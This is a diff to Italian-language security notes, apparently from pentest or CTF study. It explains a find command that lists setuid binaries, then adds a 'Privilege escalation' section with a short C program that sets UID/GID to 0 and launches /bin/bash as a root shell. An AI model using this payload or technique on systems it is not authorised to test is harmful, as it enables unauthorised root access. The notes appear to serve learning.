@@ -37,3 +37,11 @@ find / → avvia la ricerca dalla root (/), cioè in tutto il filesystem.
 -perm -4000 → seleziona file con il bit setuid impostato (il valore ottale 4000 corrisponde al bit SUID). L'opzione - davanti a 4000 richiede che tutti i bit specificati siano presenti.
 -print → stampare il percorso dei file trovati (è implicito in molte versioni di find, ma qui è esplicito).
 2>/dev/null → reindirizza gli errori (es. Permission denied) verso /dev/null per non intasare l'output.
+
+# Privilege escalation:
+
+int main() { 
+    setuid(0); setgid(0); // setta GID/UID effettivi a 0 (root)
+    execl("/bin/bash", "bash", NULL); // sostituisce il processo con /bin/bash.
+    return 0; 
+}
